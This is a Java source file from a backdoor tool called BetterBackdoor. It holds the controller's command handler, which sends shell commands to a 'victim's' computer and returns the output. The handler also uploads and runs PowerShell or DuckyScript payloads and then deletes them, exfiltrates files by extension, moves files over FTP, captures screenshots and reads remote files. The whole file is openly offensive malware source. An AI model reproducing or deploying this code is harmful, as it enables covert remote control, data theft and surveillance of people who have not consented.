package com.github.thatcherdev.betterbackdoor.shell;

import java.io.File;
import java.io.IOException;
import com.github.thatcherdev.betterbackdoor.BetterBackdoor;
import com.github.thatcherdev.betterbackdoor.backend.FTP;

public class HandleCommand {

	/**
	 * Handles command {@link command} given by user.
	 *
	 * @param command command given by user
	 * @throws IOException
	 */
	public static void handle(String command) throws IOException {
		if (command.equals("cmd")) {
			System.out.println(
					"Commands will now be executed through vitim's computer's Command Prompt\nEnter 'back' to go back");
			while (true) {
				System.out.print("cmd");
				String cmdCommand = BetterBackdoor.getInput("");
				if (cmdCommand.equals("back"))
					break;
				Shell.out.println("cmd " + cmdCommand);
				System.out.println(getResp());
			}
		} else if (command.equals("ps") || command.equals("ds")) {
			System.out.print("This will send a local ");
			if (command.equals("ps"))
				System.out.print("PowerShell script ");
			else
				System.out.print("DuckyScript");
			System.out.println(" to the victims computer, execute it, and delete it.");
			System.out.println("Enter local filepath of script:");
			File file = new File(BetterBackdoor.getInput("file"));
			System.out.println("Sending script...");
			Shell.out.println("filesend " + file.getName());
			FTP.shell(file.getAbsolutePath(), "send");
			System.out.println(getResp());
			System.out.println("Running script...");
			Shell.out.println(command + " " + file.getName());
			System.out.println(getResp());
		} else if (command.equals("exfiles")) {
			System.out.println(
					"This will copy files with desired extensions from a folder and all it's subfolders to 'C:\\Users\\USERNAME\\AppData\\gathered\\ExfiltratedFiles' on the victim's computer");
			System.out.println("Enter victim's directory to search through:");
			String root = BetterBackdoor.getInput("");
			System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
			String exts = BetterBackdoor.getInput("");
			Shell.out.println("exfiles " + root + "*" + exts);
			System.out.println("Exfiltrating...\n");
			System.out.println(getResp());
		} else if (command.equals("filesend")) {
			System.out.println("Enter local filepath of file to send:");
			String fileSend = BetterBackdoor.getInput("file");
			System.out.println("Enter victim's filepath of file to receive:");
			String fileRec = BetterBackdoor.getInput("");
			Shell.out.println("filesend " + fileRec);
			FTP.shell(fileSend, "send");
			System.out.println(getResp());
		} else if (command.equals("filerec")) {
			System.out.println("Enter victim's filepath of file to send:");
			String fileSend = BetterBackdoor.getInput("");
			System.out.println("Enter local filepath of file to receive:");
			String fileRec = BetterBackdoor.getInput("");
			Shell.out.println("filerec " + fileSend);
			FTP.shell(fileRec, "rec");
			System.out.println(getResp());
		} else if (command.equals("ss")) {
			Shell.out.println("ss");
			System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + File.separator
					+ "screenshot.png'...");
			FTP.shell("screenshot.png", "rec");
			System.out.println(getResp());
		} else if (command.equals("cat")) {
			System.out.println("Enter victim's filepath of file to get contents of:");
			Shell.out.println("cat " + BetterBackdoor.getInput(""));
			System.out.println(getResp());
		} else if (command.equals("exit"))
			System.exit(0);
		else {
			Shell.out.println(command);
			System.out.println(getResp());
		}
	}

	/**
	 * Gets response from client.
	 *
	 * @return response from client
	 */
	private static String getResp() {
		String resp = "";
		while (Shell.in.hasNextLine()) {
			String line = Shell.in.nextLine();
			if (line.equals("!$end$!"))
				break;
			resp += line + "\n";
		}
		return resp.substring(0, resp.length() - 1);
	}
}